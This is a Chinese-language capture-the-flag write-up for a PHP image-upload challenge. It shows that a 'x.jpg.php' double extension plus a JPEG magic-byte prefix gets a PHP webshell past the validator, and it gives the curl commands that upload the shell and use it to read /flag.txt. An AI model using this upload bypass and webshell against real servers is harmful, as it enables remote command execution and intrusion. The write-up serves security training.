## 题解

### 入口与指纹

`Apache/2.4.38` + `PHP/7.1.33`，标题 `Image Upload`，表单 `index.php`，字段 `userfile`。
上传非 JPG 返回 `Invalid Image file. We only support JPG files.`，上传成功回显
`upload/<filename>`。

### 关键观察

**1. 校验只看「最后一个点之后不是 php」和内容前缀，不看倒数第二段。**

| 文件名 | 结果 |
| --- | --- |
| `s.php` | 拒绝 |
| `x.phtml` / `x.php5` / `x.PHP` / `.htaccess` | 拒绝 |
| `x.php.jpg` | 接受 |
| `x.jpg.php` | **接受**，并且落盘后**被 PHP 解析执行** |

**2. 加 4 字节 JPEG 魔数就能过内容检查。**

`\xff\xd8\xff\xe0` + `<?php ... ?>` 会被当成合法图片。

### 利用链

```bash
T=$(head -1 .target)
printf '\xff\xd8\xff\xe0' > p.php
printf '<?php echo "PWN:"; system($_GET["c"]); ?>' >> p.php
curl -sS -F 'userfile=@p.php;filename=p.jpg.php;type=image/jpeg' \
     -F 'submit=1' "http://$T/index.php"
curl -sS "http://$T/upload/p.jpg.php?c=cat+/flag.txt"
# ...PWN:flag{...}
```

### flag 位置

容器的 `/flag.txt`（根目录），经上传的 webshell 读取。

## 复盘

- 后缀黑名单要测**双后缀的两个方向**：`x.php.jpg` 和 `x.jpg.php` 的命运可能完全不同。
- 只要文件名最后一段可控且服务器按最后一个 `.php` 解析，就能执行。
- 图片校验用魔数即可满足；真实图片内容不是必需的。
